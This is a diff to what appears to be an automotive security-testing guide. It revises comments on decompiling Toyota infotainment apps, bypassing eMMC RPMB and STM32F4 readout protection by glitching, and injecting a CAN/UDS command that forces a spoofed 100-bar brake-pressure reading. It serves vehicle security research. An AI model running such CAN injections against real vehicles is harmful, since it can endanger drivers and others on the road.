@@ -657,8 +657,8 @@ adb shell pm list packages -3   # third-party only
 
 # Step 3: Decompile OEM IVI apps with jadx
 adb shell pm path com.toyota.ivi.system
-# package:/data/app/com.toyota.ivi.system-XXXX/base.apk
-adb pull /data/app/com.toyota.ivi.system-XXXX/base.apk
+# package:/data/app/com.toyota.ivi.system-1a2b3c4d/base.apk  (suffix varies per build)
+adb pull /data/app/com.toyota.ivi.system-1a2b3c4d/base.apk
 jadx -d out/ base.apk
 # Extract hardcoded API endpoints, broker URLs, OTA URLs
 
@@ -1311,7 +1311,8 @@ easyjtag_read --target=emmc --start=0 --length=0x100000000 --out=ecu_emmc_insitu
 # ─── RPMB partition (Replay Protected Memory Block) ───
 # eMMC has a special RPMB partition that requires HMAC authentication
 # Reading RPMB without the OEM's key is typically impossible
-# Some exploits (CVE-2022-XXXXX) bypass RPMB on certain SoCs
+# Some SoC-specific exploits bypass RPMB (key-programming flaws / glitching
+# the authentication state machine) — research the target SoC before assuming
 
 # ─── UFS (Universal Flash Storage, newer ECUs) ───
 # UFS replaces eMMC in 2024+ ADAS / infotainment ECUs
@@ -1640,7 +1641,7 @@ cansend can0 7E0#062F0203030064
 #            SF SVC DID   CB BRAKE_PRESSURE=100 bar (forced)
 # Response: 0x7E8#046F0203 (success)
 # The ECU now reports BrakePressure=100 bar to other ECUs until control is released
-# (CVE-2018-XXXX style: vehicles without SecOC will act on this spoofed value)
+# Vehicles without SecOC (or with it disabled) will act on this spoofed value
 ```
 
 ### Secure Boot Bypass Attempts
@@ -1685,7 +1686,8 @@ EOF
 
 # ─── Boot ROM exploit ───
 # Some SoCs have immutable boot ROMs with known vulnerabilities
-# e.g., STM32F4 has a documented boot ROM vulnerability (CVE-2017-XXXXX style)
+# e.g., STM32F4 readout-protection bypass via voltage glitching (LimitedResults
+# class, 2020) — verify per SoC revision; many are errata-fixed
 # These are SoC-specific; research each target SoC
 # Search: github.com/<SoC-vendor>/<SoC-family>-security-advisories
 ```
